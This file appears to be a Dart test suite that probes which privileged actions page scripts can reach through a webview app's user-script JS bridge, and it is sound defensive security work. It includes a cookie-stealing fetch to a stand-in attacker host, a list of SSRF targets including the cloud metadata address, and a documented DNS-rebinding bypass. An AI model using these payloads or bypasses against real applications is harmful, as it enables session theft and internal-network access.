// Authorization probes for the page-reachable JS bridge that
// UserScriptService installs.
//
// user_script_handlers_test.dart covers the handlers' functional
// contract. This file asks the adversarial question instead: given that
// the shim publishes `window.__wsFetch` and patches DOM/fetch globals,
// *any* script running in a user-script-enabled page can drive these
// handlers — the site's own JS, a third-party ad script, or an XSS
// payload. These tests pin what that caller can and cannot reach.
//
// Sibling: test/browser/bridge_privilege_escalation.test.js proves the
// reachability half under a real engine.

import 'package:flutter_test/flutter_test.dart';
import 'package:http/http.dart' as http;

import 'package:webspace/services/outbound_http.dart';
import 'package:webspace/settings/user_script.dart';

import 'helpers/user_script_bridge_fakes.dart';

void main() {
  group('confirmation gate asymmetry', () {
    // The script handler treats requiresConfirmation as "ask the user".
    // The resource-fetch handler only checks for `blocked` and fetches
    // everything else, so the confirmation prompt does not apply to it.
    test('__wsFetch reaches a non-whitelisted host with no user prompt',
        () async {
      final factory = FakeOutboundFactory((_) => http.Response('SECRET', 200));
      outboundHttp = factory;
      final asked = <String>[];
      final ctrl = FakeUserScriptController();
      serviceWith(oneScript, confirm: (url) async {
        asked.add(url);
        return false;
      }).registerHandlers(ctrl);

      final res = await ctrl
          .handler(kFetchHandlerPrefix)(['https://not-whitelisted.example/x']);

      expect((res as Map)['status'], 200);
      expect(res['body'], 'SECRET');
      expect(asked, isEmpty);
      expect(factory.requested.single.host, 'not-whitelisted.example');
    });

    test('the script handler gates the same URL behind confirmation',
        () async {
      final factory = FakeOutboundFactory((_) => http.Response('CODE;', 200));
      outboundHttp = factory;
      final asked = <String>[];
      final ctrl = FakeUserScriptController();
      serviceWith(oneScript, confirm: (url) async {
        asked.add(url);
        return false;
      }).registerHandlers(ctrl);

      final ok = await ctrl
          .handler(kScriptHandlerPrefix)(['https://not-whitelisted.example/x']);

      expect(ok, isFalse);
      expect(asked, ['https://not-whitelisted.example/x']);
      expect(factory.requested, isEmpty);
    });
  });

  group('SSRF guard on the page-reachable fetch handler', () {
    const hostile = [
      'http://localhost/admin',
      'http://127.0.0.1:8080/',
      'http://10.0.0.1/',
      'http://192.168.1.1/',
      'http://172.16.0.1/',
      'http://169.254.169.254/latest/meta-data/',
      'http://[::1]/',
      'http://[fe80::1]/',
      'http://[fd00::1]/',
    ];

    for (final url in hostile) {
      test('refuses $url with 403 and issues no request', () async {
        final factory = FakeOutboundFactory((_) => http.Response('x', 200));
        outboundHttp = factory;
        final ctrl = FakeUserScriptController();
        serviceWith(oneScript).registerHandlers(ctrl);

        final res = await ctrl.handler(kFetchHandlerPrefix)([url]);

        expect((res as Map)['status'], 403, reason: url);
        expect(factory.requested, isEmpty, reason: url);
      });
    }

    // Documented gap, not a passing defense. _isPrivateOrLoopbackHost
    // matches literal addresses in the URL string; it never resolves.
    // A hostname whose A record points at loopback or the LAN walks
    // straight through, so DNS rebinding defeats this guard. Pinned so
    // that a future resolve-then-check fix has a test to flip.
    test('KNOWN GAP: a hostname is not checked against what it resolves to',
        () async {
      final factory = FakeOutboundFactory((_) => http.Response('x', 200));
      outboundHttp = factory;
      final ctrl = FakeUserScriptController();
      serviceWith(oneScript).registerHandlers(ctrl);

      expect(classifyScriptFetchUrl('http://localtest.me/admin'),
          ScriptFetchUrlStatus.requiresConfirmation);

      final res = await ctrl.handler(kFetchHandlerPrefix)([
        'http://localtest.me/admin',
      ]);

      expect((res as Map)['status'], 200);
      expect(factory.requested.single.host, 'localtest.me');
    });
  });

  group('inline-script bridge', () {
    // The inline handler exists to run scripts the page's CSP would
    // refuse. It applies no origin, whitelist, or provenance check to
    // the source it is handed, so whoever can reach the bridge gets
    // CSP-exempt execution.
    test('evaluates whatever source the caller supplies', () async {
      outboundHttp = FakeOutboundFactory((_) => http.Response('x', 200));
      final ctrl = FakeUserScriptController();
      serviceWith(oneScript).registerHandlers(ctrl);

      await ctrl.handler(kInlineHandlerPrefix)([
        'fetch("https://attacker.example/?c="+document.cookie)',
      ]);

      expect(ctrl.evaluatedAny('attacker.example'), isTrue);
    });

    test('handlers are absent entirely when the site has no user scripts',
        () async {
      final ctrl = FakeUserScriptController();
      serviceWith([]).registerHandlers(ctrl);

      expect(ctrl.handlers, isEmpty);
    });

    test('a disabled script leaves the bridge uninstalled', () async {
      final ctrl = FakeUserScriptController();
      serviceWith([
        UserScriptConfig(name: 'off', source: 'noop;', enabled: false),
      ]).registerHandlers(ctrl);

      expect(ctrl.handlers, isEmpty);
    });
  });

  group('handler naming', () {
    // Handler names are derived from the wall clock, so they are
    // guessable by anyone who can estimate when the webview was built.
    // That is fine only because the names are not the access control:
    // the shim publishes window.__wsFetch as a plain global, so page
    // script never needs to know a handler name. This test pins the
    // derivation so nobody mistakes it for a secret.
    test('names are time-derived, not random', () async {
      final before = DateTime.now().microsecondsSinceEpoch;
      final ctrl = FakeUserScriptController();
      serviceWith(oneScript).registerHandlers(ctrl);
      final after = DateTime.now().microsecondsSinceEpoch;

      for (final prefix in [
        kScriptHandlerPrefix,
        kInlineHandlerPrefix,
        kFetchHandlerPrefix,
      ]) {
        final name = ctrl.handlerName(prefix);
        final suffix = name.substring(prefix.length);
        final stamp = int.parse(suffix, radix: 36);
        expect(stamp, inInclusiveRange(before, after), reason: name);
      }
    });
  });
}
